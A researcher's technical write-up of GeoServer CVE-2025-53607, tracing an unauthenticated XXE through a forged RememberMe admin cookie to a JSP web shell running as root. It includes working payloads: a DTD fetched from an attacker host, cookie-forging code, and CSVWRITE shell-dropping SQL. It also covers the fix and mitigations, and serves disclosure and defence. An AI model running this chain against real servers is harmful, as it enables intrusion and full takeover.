---
layout: default
title: "GeoServer — From Unauthenticated XXE to RCE"
subtitle: "Walking through CVE-2025-53607, line by line, from a schemaLocation attribute to a root shell"
description: "Technical analysis of CVE-2025-53607 (GHSA-cggp-wx63-hrxr) in GeoServer 2.28.2 — how an attacker-controlled xsi:schemaLocation silently drops the AllowListEntityResolver inside GeoTools, leading to unauthenticated file read, admin takeover via a forged RememberMe cookie, and remote code execution through an H2 SQL view."
date: 2026-11-23
tags:
  - geoserver
  - geotools
  - xxe
  - ssrf
  - rce
  - java
  - exploit-development
  - CVE-2025-53607
  - vulnerability-research
  - cybersecurity
---

# GeoServer — From Unauthenticated XXE to RCE
_Walking through CVE-2025-53607, line by line, from a schemaLocation attribute to a root shell_

The advisory [**GHSA-cggp-wx63-hrxr**](https://github.com/geoserver/geoserver/security/advisories/GHSA-cggp-wx63-hrxr) (**CVE-2025-53607**) was finally published. It describes an **unauthenticated XXE file read and SSRF via `xsi:schemaLocation`** in GeoServer OWS requests. I was one of the researchers who reported it, and now that patched releases are out, I want to share how the bug actually works under the hood — and how, in a default GeoServer **2.28.2** installation, it can be pushed all the way from a single anonymous XML request to **remote code execution**.

The advisory itself is rated as file read + SSRF. That is correct for the bug in isolation. But the file it lets you read is exactly the one that holds the keys to the admin panel, and from there GeoServer gives an administrator enough rope to write files on disk.

The full chain:

1. **Unauthenticated XXE** — WFS `strict=true` + `xsi:schemaLocation` → attacker XSD → external DTD → read `users.xml`.
2. **Admin takeover** — forge a `remember-me` cookie using the leaked password digest and the default static key.
3. **RCE** — create an H2 datastore and a SQL view using `CSVWRITE` to drop a JSP into Tomcat.

All code references below are from the **GeoServer 2.28.2** tag and **GeoTools 34.2** (`gt-xsd-core`), the versions shipped together.

## Affected Versions

| Component | Vulnerable | Patched |
|---|---|---|
| GeoServer | `<= 2.27.5`, `2.28.0 – 2.28.3` | 2.27.6, 2.28.4, 3.0.0 |
| GeoTools `gt-xsd-core` | `<= 33.5`, `34.0 – 34.3` | 33.6, 34.4, 35.0 |

CVSS 3.1: **8.2** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L` (CWE-611, CWE-918).

## Stage 1 — The Unauthenticated XXE

### Entry point: the `strict` flag

Everything starts with a plain WFS `GetFeature` sent as an XML `POST`. No authentication is needed: the `default` filter chain in `security/config.xml` ends with the `anonymous` filter, and WFS is a core service enabled out of the box.

The interesting part is the `strict` KVP parameter. In `src/wfs/src/main/java/org/geoserver/wfs/xml/v1_0_0/WfsXmlReader.java`:

```java
// WfsXmlReader.java:55
Boolean strict = (Boolean) kvp.get("strict");
if (strict == null) {
    strict = Boolean.FALSE;
}

// create the parser instance
Parser parser = new Parser(configuration);
parser.setEntityResolver(entityResolverProvider.getEntityResolver());   // :62
...
// set validation based on strict or not
parser.setValidating(strict.booleanValue());                             // :68
```

Two things to notice here:

- At **line 62** GeoServer does the right thing: it plugs the `EntityResolver` returned by `EntityResolverProvider`. By default (`EntityResolverProvider.java:74`) this is the **`AllowListEntityResolver`**, which only allows `www.w3.org`, `schemas.opengis.net`, `www.opengis.net`, INSPIRE and schemas bundled with GeoServer, and blocks `file://` entirely.
- At **line 68** the request itself decides whether the parser runs in **validating** mode. Appending `?strict=true` to the URL is enough.

Both settings are forwarded to the GeoTools `ParserHandler` (`Parser.java:206-207` and `Parser.java:282-283`):

```java
public void setValidating(boolean validating) {
    handler.setValidating(validating);
}
...
public void setEntityResolver(EntityResolver entityResolver) {
    handler.setEntityResolver(entityResolver);
}
```

### The root element and `xsi:schemaLocation`

When the SAX parser hits the first element of the request, `ParserHandler.startElement` (`ParserHandler.java:341`) calls `loadSchemas(uri, attributes)`. For the root element, the schema locations are taken **directly from the request** (`ParserHandler.java:720`):

```java
if (name.endsWith("schemaLocation")) {
    // create an array of alternating namespace, location pairs
    locations = attributes.getValue(i).split(" +");
    break;
}
```

For each `namespace location` pair, GeoTools first asks the configured `XSDSchemaLocationResolver`s and `XSDSchemaLocator`s for an override. Those know about OGC namespaces (WFS, GML, Filter...). If we use a namespace nobody knows, like `http://evil.example/ns`, no override is found and the code falls into this block (`ParserHandler.java:575-583`):

```java
// if no schema override was found, parse location directly
if (schemas[i / 2] == null) {
    // validate the schema location
    if (isValidating()) {
        try {
            Schemas.validateImportsIncludes(location, locators, resolvers, entityResolver);
        } catch (IOException e) {
            throw (SAXException) new SAXException("error validating").initCause(e);
        }
    }

    // parse the document
    try {
        schemas[i / 2] = Schemas.parse(location, locators, resolvers, uriHandlers, entityResolver);
```

It's worth noting that `Schemas.parse()` actually **does** check the location against the resolver before fetching it (`Schemas.java:324-329`, `entityResolver.resolveEntity(null, uri.toString())`). The `AllowListEntityResolver` would reject our URL right there.

The problem is that `validateImportsIncludes()` runs **before** it — and it only runs when `strict=true`.

### The root cause: `SAXParser.parse(String, DefaultHandler)`

This is the vulnerable method, `Schemas.java:524-582` in GeoTools 34.2:

```java
public static final List validateImportsIncludes(
        String location,
        List<XSDSchemaLocator> locators,
        List<XSDSchemaLocationResolver> resolvers,
        EntityResolver entityResolver)
        throws IOException {
    ...
    // create a parser
    SAXParserFactory factory = SAXParserFactory.newInstance();          // :536
    factory.setNamespaceAware(true);
    factory.setValidating(false);
    ...
    if (entityResolver != null) {
        try {
            parser.getXMLReader().setEntityResolver(entityResolver);       // :549
        } catch (SAXException e) {
            throw new IOException(e);
        }
    }

    SchemaImportIncludeValidator validator =
            new SchemaImportIncludeValidator(locators, resolvers);         // :555
    ...
    while (!q.isEmpty()) {
        location = q.removeFirst();
        validator.setBaseLocation(location);

        try {
            parser.parse(location, validator);                             // :566
        } catch (SAXException e) {
            throw (IOException) new IOException("parse error").initCause(e);
        }
```

At first glance it looks fine: the `AllowListEntityResolver` is set on the `XMLReader` at **line 549**.

But look at **line 566**. `validator` is a `SchemaImportIncludeValidator`, which `extends DefaultHandler` (`Schemas.java:584`). And this is what the JDK does inside `javax.xml.parsers.SAXParser.parse(InputSource, DefaultHandler)`:

```java
XMLReader reader = this.getXMLReader();
if (dh != null) {
    reader.setContentHandler(dh);
    reader.setEntityResolver(dh);   // <-- overwrites the AllowListEntityResolver
    reader.setErrorHandler(dh);
    reader.setDTDHandler(dh);
}
reader.parse(is);
```

`DefaultHandler` implements `EntityResolver`, so calling `parse(String, DefaultHandler)` **silently replaces** the resolver configured three lines above with the handler itself. And `DefaultHandler.resolveEntity()` simply returns `null`, which tells Xerces: _"resolve it yourself, any protocol you like"_.

On top of that, the `SAXParserFactory` at **line 536** is created with no hardening at all — no `disallow-doctype-decl`, no `external-general-entities`/`external-parameter-entities` disabled, no `ACCESS_EXTERNAL_DTD` restriction. So once the resolver is gone, nothing else stands in the way.

That gives us two primitives:

- **SSRF** — `parser.parse(location, ...)` fetches the attacker URL from `schemaLocation` directly. It is not an entity, so no resolver is consulted at all, even before the override. (This "first fetch" was tracked separately as [GHSA-rg89-jmrw-x26f](https://github.com/geoserver/geoserver/security/advisories/GHSA-rg89-jmrw-x26f), fixed in 3.0.2, 2.28.6 and 2.27.7.)
- **XXE** — any `DOCTYPE` inside the fetched XSD is processed by a parser with no entity resolver, so external DTDs and parameter entities are expanded freely, including `file://`.

### The payloads

The attacker hosts two files. The XSD only exists to carry a `DOCTYPE` pointing to an external DTD:

```xml
<!-- ext.xsd -->
<?xml version="1.0"?>
<!DOCTYPE xsd:schema SYSTEM "http://ATTACKER/evil.dtd">
<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            targetNamespace="http://evil.example/ns"/>
```

The DTD uses the classic error-based technique: read the file into a parameter entity, then use it as part of a `file://` path that doesn't exist.

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///opt/geoserver_data/security/usergroup/default/users.xml">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///NONE/%file;/X'>">
%eval;
%err;
```

And the trigger, sent without any credentials:

```http
POST /geoserver/wfs?strict=true HTTP/1.1
Host: target:8080
Content-Type: text/xml

<wfs:GetFeature service="WFS" version="1.0.0"
    xmlns:wfs="http://www.opengis.net/wfs"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://evil.example/ns http://ATTACKER/ext.xsd">
  <wfs:Query typeName="ne:countries"/>
</wfs:GetFeature>
```

The flow on the server side:

```
WfsXmlReader.read()                         strict=true  -> setValidating(true)
 └─ ParserHandler.startElement()            :341
     └─ loadSchemas()                       :524  schemaLocation from request
         └─ Schemas.validateImportsIncludes()  :579
             └─ SAXParser.parse(location, validator)  :566
                 ├─ GET http://ATTACKER/ext.xsd          (SSRF, no resolver check)
                 ├─ GET http://ATTACKER/evil.dtd         (resolver replaced by DefaultHandler)
                 ├─ read file:///.../users.xml           (%file;)
                 └─ open file:///NONE/<users.xml>/X      -> FileNotFoundException
```

### Getting the file back in-band

No out-of-band channel is needed. The `FileNotFoundException` carries the non-existent path — which now contains the whole `users.xml` — in its message.

That exception is wrapped as `IOException("parse error")` (`Schemas.java:568`), then as `SAXException("error validating")` (`ParserHandler.java:581`), and reaches `XmlRequestReader.cleanException()` (`XmlRequestReader.java:151`). That method was designed exactly to avoid leaking `FileNotFound` messages, but it only sanitizes a bare `IOException` or a `SAXException` whose message **repeats** its cause's message. `"error validating"` doesn't contain the cause message, so the exception passes through untouched.

Finally, `WfsExceptionHandler` (`WfsExceptionHandler.java:110`) calls `OwsUtils.dumpExceptionMessages()` (`OwsUtils.java:236`), which walks the **entire cause chain** and appends every message to the response:

```xml
<ServiceExceptionReport version="1.2.0" ...>
  <ServiceException>
    error validating
    parse error
    /NONE/&lt;?xml version="1.0" encoding="UTF-8"?&gt;
    &lt;userRegistry version="1.0" xmlns="http://www.geoserver.org/security/users"&gt;
        &lt;users&gt;
            &lt;user enabled="true" name="admin"
                  password="digest1:yk6WeWF0HhZEC1o626u0gkgoiFo9+bqY36zHgRvrnfmC2sDpwTIWlgLWa492NEkO"/&gt;
    ...
  </ServiceException>
</ServiceExceptionReport>
```

The same schema processing is shared by other OWS services, so the advisory also lists CSW `GetRecords`, WCS 1.1.1 and WCS 1.0.0 `DescribeCoverage` as entry points. Blocking a single endpoint is not enough.

## Stage 2 — From a Password Digest to Admin

The `digest1:` value is a salted Jasypt digest — not something you want to crack. Fortunately, we don't have to.

### The RememberMe signature

GeoServer uses Spring Security's `TokenBasedRememberMeServices`, wrapped by `GeoServerTokenBasedRememberMeServices`. The cookie signature is:

```
MD5( username + ":" + expiryTime + ":" + password + ":" + key )
```

where **`password` is whatever the user details service returns** — in GeoServer, the stored `digest1:...` string, exactly what we just leaked. `GeoServerTokenBasedRememberMeServices.makeTokenSignature()` (`GeoServerTokenBasedRememberMeServices.java:91-101`) only strips the `@userGroupService` suffix from the username before signing.

The last piece is the `key`. In the default data directory, `security/config.xml` ships with:

```xml
<rememberMeService>
  <className>org.geoserver.security.rememberme.GeoServerTokenBasedRememberMeServices</className>
  <key>geoserver</key>
</rememberMeService>
```

A static, public key. So forging the cookie is trivial:

```python
exp = int((time.time() + 14 * 86400) * 1000)
sig = md5(f"admin@default:{exp}:{digest}:geoserver".encode()).hexdigest()
token = quote("admin@default", safe="") + f":{exp}:MD5:{sig}"
cookie = base64.b64encode(token.encode()).decode()
# Cookie: remember-me=<cookie>
```

### Priming a session for REST

There is one small detail. Looking at the filter chains in `security/config.xml`:

- `web` (`/web/**`) → `rememberme`, `form`, `anonymous` — **`allowSessionCreation="true"`**
- `rest` (`/rest/**`) → `basic`, `anonymous` — no `rememberme` filter

So the cookie alone is rejected by `/rest`. But the `web` chain is allowed to create an HTTP session, and the authenticated security context is stored in it. Hitting any admin page with the forged cookie returns a `JSESSIONID` bound to an admin context:

```http
GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.admin.StatusPage HTTP/1.1
Cookie: remember-me=<forged>

HTTP/1.1 200 OK
Set-Cookie: JSESSIONID=8E1F...; Path=/geoserver; HttpOnly
```

The `rest` chain can't create sessions, but it does **reuse** an existing one. Sending that `JSESSIONID` to `/rest/about/version.xml` returns `200` — we're admin on the REST API.

## Stage 3 — From Admin to RCE

GeoServer core ships with `gt-jdbc-h2` and the old **H2 1.1.119** driver in `WEB-INF/lib`. An administrator can create an H2 datastore pointing to any path and, on top of it, a **SQL view** (`JDBC_VIRTUAL_TABLE`, `FeatureTypeInfo.java:27`) with arbitrary SQL. H2 has a built-in `CSVWRITE` function that writes the result of a query to any file the JVM can write.

1) Create the datastore:

```http
POST /geoserver/rest/workspaces/sf/datastores
Cookie: JSESSIONID=...; remember-me=...
Content-Type: application/xml

<dataStore><name>pwnds</name><connectionParameters>
  <entry key="dbtype">h2</entry>
  <entry key="database">/tmp/pwnds</entry>
</connectionParameters></dataStore>
```

2) Create a SQL view whose query writes a JSP into the Tomcat `ROOT` context:

```sql
SELECT CSVWRITE(
  '/usr/local/tomcat/webapps/ROOT/sh.jsp',
  'SELECT ''<% if(request.getParameter("c")!=null){ Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("c")}); java.io.InputStream is=p.getInputStream(); int b; while((b=is.read())!=-1){ out.write(b); } } %>'' AS a',
  'UTF-8', '', '', ''
) AS gid
```

A few details that matter with H2 1.1.119:

- Only the **positional** form of `CSVWRITE` is supported (no options string / `writeColumnHeader=false`).
- The `AS a` alias makes the CSV header a harmless `A` line instead of repeating the JSP, so the command runs once.
- Empty `fieldDelimiter` and `escape` arguments prevent the value from being wrapped in quotes.

3) Trigger the query with a plain `GetFeature` on the new layer:

```http
GET /geoserver/wfs?service=WFS&version=1.1.0&request=GetFeature&typeName=sf:pwnft&maxFeatures=1
```

4) Execute:

```http
GET /sh.jsp?c=id HTTP/1.1

A
uid=0(root) gid=0(root) groups=0(root)
```

In the official Docker image (`docker.osgeo.org/geoserver:2.28.2`), Tomcat runs as **root** and the `ROOT` webapp is deployed, so the chain ends with a root shell. On other deployments the JSP path changes, but any writable directory served by the container works the same way.

## What I Confirmed

The full chain was confirmed end-to-end against **GeoServer 2.28.2** (official Docker image, default data directory), going from zero credentials to `uid=0(root)` with only HTTP requests.

<video controls autoplay muted loop playsinline preload="metadata" style="width:100%;height:auto;border-radius:6px;" aria-label="PoC: GeoServer 2.28.2 unauthenticated XXE to RCE as root">
  <source src="/assets/videos/geoserver-xxe-to-rce-poc.mp4" type="video/mp4">
  Your browser does not support the video tag. <a href="/assets/videos/geoserver-xxe-to-rce-poc.mp4">Download the PoC video</a>.
</video>

Exploit output:

```
[1] reading /opt/geoserver_data/security/usergroup/default/users.xml via XXE schemaLocation->external DTD (unauth)...
[+] admin digest: digest1:yk6WeWF0HhZEC1o626u0gkgoiFo9+bqY36zHgRvrnfmC2sDpwTIWlgLWa492NEkO
[2] forging RememberMe cookie (user='admin@default', key='geoserver')...
[2b] priming admin session via /web/ (StatusPage)...
[+] /rest/about/version.xml -> HTTP 200 (200 = admin OK)
[3] RCE via H2 CSVWRITE -> JSP in Tomcat ROOT...
[3a] H2 datastore -> HTTP 201
[3b] SQL view CSVWRITE -> HTTP 201
[3c] GetFeature triggers CSVWRITE -> HTTP 200
[3d] GET /sh.jsp -> HTTP 200

===== OUTPUT ('id') =====
uid=0(root) gid=0(root) groups=0(root)
```

The attacker only needs the target to reach an HTTP server they control (a VPS or a tunnel works fine). I also tested **GeoServer 3.0.1**: the XXE is no longer reproducible there (`disallow-doctype-decl` is enforced, and the `AllowListEntityResolver` blocks `file://` resolution), but the first schema fetch still happened at that point, which is the SSRF later addressed by GHSA-rg89-jmrw-x26f.

## The Fix

The fix landed in GeoTools as [GEOT-7883](https://osgeo-org.atlassian.net/browse/GEOT-7883) (34.4 / 35.0 / 33.6). It's small, and it goes exactly at line 566: the `SchemaImportIncludeValidator` now **receives the resolver and overrides `resolveEntity`**, so when `SAXParser.parse()` installs the handler as the entity resolver, it still delegates to the restricted one.

```diff
-        SchemaImportIncludeValidator validator = new SchemaImportIncludeValidator(locators, resolvers);
+        SchemaImportIncludeValidator validator = new SchemaImportIncludeValidator(locators, resolvers, entityResolver);
 ...
+        /** custom entity resolver */
+        EntityResolver entityResolver;
 ...
+            this.entityResolver = entityResolver == null ? DefaultEntityResolver.INSTANCE : entityResolver;
 ...
+        @Override
+        public InputSource resolveEntity(String publicId, String systemId) throws SAXException, IOException {
+            if (entityResolver == null) {
+                return super.resolveEntity(publicId, systemId);
+            }
+            return entityResolver.resolveEntity(publicId, systemId);
+        }
```

A good reminder for anyone writing Java XML code: **`SAXParser.parse(..., DefaultHandler)` overrides any `EntityResolver` you set on the `XMLReader`**. If your handler extends `DefaultHandler`, the resolver belongs in the handler.

## Mitigation

There is no configuration workaround for the XXE. Upgrade:

- **GeoServer 2.27.6, 2.28.4 or 3.0.0** — fixes CVE-2025-53607.
- **GeoServer 2.27.7, 2.28.6 or 3.0.2** — also fixes the remaining first schema fetch (GHSA-rg89-jmrw-x26f).

Defense in depth, which would have broken the chain at other points:

- **Block outgoing connections** from the GeoServer host. The attacker schema is never fetched.
- **Change the RememberMe key** in `security/config.xml` (or disable RememberMe). With a static `geoserver` key, any leak of `users.xml` is an admin takeover.
- Don't expose `/geoserver/rest` and `/geoserver/web` to the internet.
- Don't run Tomcat as root, and keep the webapps directory read-only.
- Remove the H2 datastore/driver if you don't use it.

## References

- [GHSA-cggp-wx63-hrxr — Unauthenticated XXE file read and SSRF via xsi:schemaLocation in OWS requests](https://github.com/geoserver/geoserver/security/advisories/GHSA-cggp-wx63-hrxr)
- [CVE-2025-53607](https://www.cve.org/CVERecord?id=CVE-2025-53607)
- [GEOT-7883](https://osgeo-org.atlassian.net/browse/GEOT-7883)
- [GHSA-rg89-jmrw-x26f](https://github.com/geoserver/geoserver/security/advisories/GHSA-rg89-jmrw-x26f)
- [phor3nsic/CVE-2025-53607 — Exploit](https://github.com/phor3nsic/CVE-2025-53607)

## Credits

This issue was independently reported by **ColdFusionX**, **chudyPB** and me. Thanks to **Jody Garnett** for coordinating the advisory, **Pierre Mauduit** for the remediation, and **axl8713** for the analysis — and to the whole GeoServer and GeoTools teams for handling it.

## Exploit

The exploit code is available at: [github.com/phor3nsic/CVE-2025-53607](https://github.com/phor3nsic/CVE-2025-53607)

**Peace!**
